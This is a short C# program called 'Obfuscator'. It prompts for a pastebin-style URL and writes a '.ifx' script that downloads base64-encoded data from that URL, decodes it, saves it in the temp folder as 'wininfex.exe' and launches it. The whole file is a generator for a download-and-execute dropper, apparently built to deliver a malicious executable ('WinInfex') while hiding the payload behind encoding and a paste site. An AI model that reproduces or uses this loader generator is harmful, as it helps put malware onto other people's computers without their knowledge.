using System;
using System.IO;

class Obfuscator
{
    static void Main()
    {
        Console.Write("Enter URL where you host raw data (http://pastebin.com/...): ");
        string url = Console.ReadLine()?.Trim();

        if (string.IsNullOrEmpty(url))
        {
            Console.WriteLine("URL cannot be empty.");
            return;
        }

        Console.Write("Enter output file name (filename.ifx): ");
        string fileName = Console.ReadLine()?.Trim();

        if (string.IsNullOrEmpty(fileName) || !fileName.EndsWith(".ifx"))
        {
            Console.WriteLine("Invalid file name. It must end with .ifx");
            return;
        }

       
        string[] lines = new[]
    {
    $"0xS 0x10 # {url}",
    "0xNET.GET 0x10 -> 0x20",
    "0xBASE64.DECODE 0x20 -> 0x30",
    "0xTMP.PATH -> 0x40",
    "0xPATH.JOIN 0x40, \"wininfex.exe\" -> 0x50",
    "0xFILE.WRITE 0x50, 0x30",
    "0xPROC.START 0x50",
    "0x01 # WinInfex started."
     };

        File.WriteAllLines(fileName, lines);
        Console.WriteLine($"File '{fileName}' created successfully.");
    }
}
